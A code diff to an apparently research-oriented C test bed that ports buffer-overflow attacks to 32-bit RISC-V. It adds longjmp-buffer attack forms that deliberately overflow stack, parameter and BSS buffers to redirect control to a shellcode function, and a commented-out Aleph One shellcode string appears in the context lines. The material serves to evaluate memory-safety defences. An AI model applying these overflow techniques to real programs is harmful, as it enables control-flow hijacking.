@@ -26,10 +26,10 @@
 /*
  * Porting the buffer-overflow attacks to 32-bits RISC-V architectures.
  *
- * Copyright 2018 Luca Piccolboni, Christian Palmiero, Giuseppe Di Guglielmo, 
+ * Copyright 2018 Luca Piccolboni, Christian Palmiero, Giuseppe Di Guglielmo,
  * and Luca P. Carloni, Dept. of Computer Science, Columbia University, NY,
  * USA. piccolboni@cs.columbia.edu http://www.cs.columbia.edu/~piccolboni/
- * 
+ *
  * Modified by Pascal Pieper (DFKI)
  *
  * The modifications made by us are tagged with the acronym SLD, which
@@ -37,6 +37,8 @@
  */
 
 #include <stdio.h>
+#include <setjmp.h>
+/* mc2zk added the following include to get rid of warnings */
 #include <string.h>
 
 /* SLD: Added for exit(). */
@@ -52,7 +54,7 @@ long overflow_buffer[OVERFLOWSIZE];
 /* "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" */
 /* "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" */
 /* "\x80\xe8\xdc\xff\xff\xff/bin/sh"; */ /* Implemented by Aleph One */
-/* SLD: we used a function instead of the shellcode for compatibility 
+/* SLD: we used a function instead of the shellcode for compatibility
  * with platforms that allow execution only in bare-metal (no OS). */
 void shellcode(void) {
 
@@ -130,6 +132,67 @@ void vuln_parameter_function_ptr(int choice) {
 
 /*****************************************************************/
 
+void parameter_longjmp_buf(int choice, jmp_buf stack_jmp_buffer) {
+  long *stack_pointer;
+  long stack_buffer[BUFSIZE];
+  char propolice_dummy[10];
+  int overflow, i, offset;
+
+  if ((choice == -3) &&
+      ((long)&stack_jmp_buffer[0]/*.__jmpbuf[5]*/ > (long)&propolice_dummy)) {
+    /* First set up overflow_buffer with copies of address to
+       stack_jmp_buffer's argument pointer, and a fake jmp_buf
+       containing a new program counter pointing to the shellcode */
+    overflow = (int)((long)&stack_jmp_buffer[0]/*.__jmpbuf[5]*/
+		     - (long)&stack_buffer);
+    for(i=0; i<overflow/4; i++)
+      overflow_buffer[i] = (long)stack_jmp_buffer;
+
+    /* Copy BX, SI, DI, BP and SP from stack_jmp_buffer */
+    for (i=0; i<5; i++)
+      overflow_buffer[overflow/4-5+i] = (long)stack_jmp_buffer[0]/*.__jmpbuf[i]*/;
+    overflow_buffer[overflow/4] = (long)&shellcode;
+
+    /* Then overflow stack_buffer with overflow_buffer  */
+    memcpy(stack_buffer, overflow_buffer, overflow+4);
+  }
+
+  else if ((choice == -1) &&
+	   ((long)&stack_pointer > (long)&propolice_dummy)) {
+    /* First set up overflow_buffer with the address of the
+       shellcode, a few 'A's and a pointer to the program
+       counter in stack_jmp_buffer*/
+    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
+    overflow_buffer[0] = (long)&shellcode;
+    memset(overflow_buffer+1, 'A', overflow-8);
+    overflow_buffer[overflow/4-1] = (long)&stack_jmp_buffer[0]/*.__jmpbuf[5]*/;
+
+    /* Then overflow stack_buffer with overflow_buffer */
+    memcpy(stack_buffer, overflow_buffer, overflow);
+
+    /* Overwritten data from stack_buffer is copied to where
+       the stack_pointer is pointing */
+    *stack_pointer = stack_buffer[0];
+  }
+
+  else printf("Attack form not possible\n");
+  longjmp(stack_jmp_buffer, 1);
+}
+
+
+void vuln_parameter_longjmp_buf(int choice) {
+  jmp_buf stack_jmp_buffer;
+
+  if (setjmp(stack_jmp_buffer) != 0) {
+    printf("Longjmp buffer attack failed.\n");
+    return; }
+
+  parameter_longjmp_buf(choice, stack_jmp_buffer);
+  return;
+}
+
+/*****************************************************************/
+
 /* SLD: Adding a dummy variable to use it as offset to
  * implement the attack. Alternatively we could use x8. */
 void stack_return_addr(int choice, unsigned dummy) { /* Attack forms 1(a) and 3(a) */
@@ -176,7 +239,7 @@ void vuln_stack_return_addr(int choice) {
    unsigned dummy_variable = 0;
    stack_return_addr(choice, (unsigned) &dummy_variable);
 }
- 
+
 /*****************************************************************/
 
 void vuln_stack_base_ptr(int choice) { /* Attack forms 1(b) and 3(b) */
@@ -192,7 +255,7 @@ void vuln_stack_base_ptr(int choice) { /* Attack forms 1(b) and 3(b) */
       ((long)&choice > (long)&propolice_dummy)) {
     /* First set up overflow_buffer with a fake stack frame
        consisting of a base pointer and a return address
-       pointing to the shellcode, a few 'A's and a new 
+       pointing to the shellcode, a few 'A's and a new
        base pointer pointing back at the fake stack frame */
     overflow = (int)((long)&choice - (long)&stack_buffer)-base_pointer_offset;
     /* Copy base pointer */
@@ -279,6 +342,57 @@ void vuln_stack_function_ptr(int choice) { /* Attack forms 1(c) and 3(c) */
   }
   else printf("Attack form not possible\n");
   return;
+}
+
+/*****************************************************************/
+
+void vuln_stack_longjmp_buf(int choice) { /* Attack forms 1(d) and 3(d) */
+  jmp_buf stack_jmp_buffer;
+  long *stack_pointer;
+  long stack_buffer[BUFSIZE];
+  char propolice_dummy[10];
+  int overflow, i;
+
+  if (setjmp(stack_jmp_buffer) != 0) {
+    printf("Longjmp buffer attack failed.\n");
+    return; }
+
+  if ((choice == 4) &&
+      ((long)&stack_jmp_buffer[0]/*.__jmpbuf[5]*/ > (long)&propolice_dummy)) {
+    /* First set up overflow_buffer with 'A's and a fake jmp_buf
+       containing a new program counter pointing to the shellcode */
+    overflow = (int)((long)&stack_jmp_buffer[0]/*.__jmpbuf[5]*/
+		     - (long)&stack_buffer);
+    memset(overflow_buffer, 'A', overflow-5*4);
+    /* Copy BX, SI, DI, BP and SP from stack_jmp_buffer */
+    for (i=0; i<5; i++)
+      overflow_buffer[overflow/4-5+i] = (long)stack_jmp_buffer[0]/*.__jmpbuf[i]*/;
+    overflow_buffer[overflow/4] = (long)&shellcode;
+
+    /* Then overflow stack_buffer with overflow_buffer  */
+    memcpy(stack_buffer, overflow_buffer, overflow+4);
+  }
+
+  else if ((choice == 10) &&
+	   ((long)&stack_pointer > (long)&propolice_dummy)) {
+    /* First set up overflow_buffer with the address of the
+       shellcode, a few 'A's and a pointer to the program
+       counter in stack_jmp_buffer*/
+    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
+    overflow_buffer[0] = (long)&shellcode;
+    memset(overflow_buffer+1, 'A', overflow-8);
+    overflow_buffer[overflow/4-1] = (long)&stack_jmp_buffer[0]/*.__jmpbuf[5]*/;
+
+    /* Then overflow stack_buffer with overflow_buffer */
+    memcpy(stack_buffer, overflow_buffer, overflow);
+
+    /* Overwritten data from stack_buffer is copied to where
+       the stack_pointer is pointing */
+    *stack_pointer = stack_buffer[0];
+  }
+
+  else printf("Attack form not possible\n");
+  longjmp(stack_jmp_buffer, 1);
 }
 
 /*****************************************************************/
@@ -406,6 +520,56 @@ void vuln_bss_function_ptr(int choice) { /* Attack forms 2(a) and 4(c) */
 }
 
 /*****************************************************************/
+
+void vuln_bss_longjmp_buf(int choice) { /* Attack forms 2(b) and 4(d) */
+  static char propolice_dummy_2[10];
+  static long bss_buffer[BUFSIZE];
+  static long *bss_pointer;
+  static jmp_buf bss_jmp_buffer;
+  char propolice_dummy_1[10];
+  int overflow, i;
+
+  if (setjmp(bss_jmp_buffer) != 0) {
+    printf("Longjmp buffer attack failed.\n");
+    return; }
+
+  if ((choice == 6) &&
+      ((long)&bss_jmp_buffer[0]/*.__jmpbuf[5]*/ > (long)&propolice_dummy_2)) {
+    /* First set up overflow_buffer with 'A's and a fake jmp_buf
+       containing a new program counter pointing to the shellcode */
+    overflow = (int)((long)&bss_jmp_buffer[0]/*.__jmpbuf[5]*/
+		     - (long)&bss_buffer);
+    memset(overflow_buffer, 'A', overflow-5*4);
+    /* Copy BX, SI, DI, BP and SP from bss_jmp_buffer */
+    for (i=0; i<5; i++)
+      overflow_buffer[overflow/4-5+i] = (long)bss_jmp_buffer[0]/*.__jmpbuf[i]*/;
+    overflow_buffer[overflow/4] = (long)&shellcode;
+
+    /* Then overflow bss_buffer with overflow_buffer  */
+    memcpy(bss_buffer, overflow_buffer, overflow+4);
+  }
+
+  else if ((choice == 14) &&
+	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
+    /* First set up overflow_buffer with the address of the
+       shellcode, a few 'A's and a pointer to the program
+       counter in bss_jmp_buffer*/
+    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
+    overflow_buffer[0] = (long)&shellcode;
+    memset(overflow_buffer+1, 'A', overflow-8);
+    overflow_buffer[overflow/4-1] = (long)&bss_jmp_buffer[0]/*.__jmpbuf[5]*/;
+
+    /* Then overflow bss_buffer with overflow_buffer */
+    memcpy(bss_buffer, overflow_buffer, overflow);
+
+    /* Overwritten data from bss_buffer is copied to where
+       the bss_pointer is pointing */
+    *bss_pointer = bss_buffer[0];
+  }
+  else printf("Attack form not possible\n");
+  longjmp(bss_jmp_buffer, 1);
+}
+/*****************************************************************/
 /*                          main()                               */
 /*****************************************************************/
 
@@ -428,7 +592,7 @@ const char *argv[] = { "./attack", "-2" }; /* Choice: -4. */
 /* const char *argv[] = { "./attack", "12" }; */ /* choice: +12. */
 /* const char *argv[] = { "./attack", "13" }; */ /* choice: +13. */
 /* const char *argv[] = { "./attack", "14" }; */ /* choice: +14. */
-  
+
 void setTaint(uint8_t* word, uint8_t const taint, uint16_t const size)
 {
 	for(uint16_t i = 0; i < size; i++)
@@ -507,8 +671,16 @@ int main (void) {
     vuln_parameter_function_ptr(choice);
     printf("Attack prevented.\n");
     break;
+  case -3:
+    vuln_parameter_longjmp_buf(choice);
+    printf("Attack prevented.\n");
+    break;
   case -2:
     vuln_parameter_function_ptr(choice);
+    printf("Attack prevented.\n");
+    break;
+  case -1:
+    vuln_parameter_longjmp_buf(choice);
     printf("Attack prevented.\n");
     break;
   case 1:
@@ -523,8 +695,16 @@ int main (void) {
     vuln_stack_function_ptr(choice);
     printf("Attack prevented.\n");
     break;
+  case 4:
+    vuln_stack_longjmp_buf(choice);
+    printf("Attack prevented.\n");
+    break;
   case 5:
     vuln_bss_function_ptr(choice);
+    printf("Attack prevented.\n");
+    break;
+  case 6:
+    vuln_bss_longjmp_buf(choice);
     printf("Attack prevented.\n");
     break;
   case 7:
@@ -539,6 +719,10 @@ int main (void) {
     vuln_stack_function_ptr(choice);
     printf("Attack prevented.\n");
     break;
+  case 10:
+    vuln_stack_longjmp_buf(choice);
+    printf("Attack prevented.\n");
+    break;
   case 11:
     vuln_bss_return_addr(choice);
     printf("Attack prevented.\n");
@@ -549,6 +733,10 @@ int main (void) {
     break;
   case 13:
     vuln_bss_function_ptr(choice);
+    printf("Attack prevented.\n");
+    break;
+  case 14:
+    vuln_bss_longjmp_buf(choice);
     printf("Attack prevented.\n");
     break;
   default:
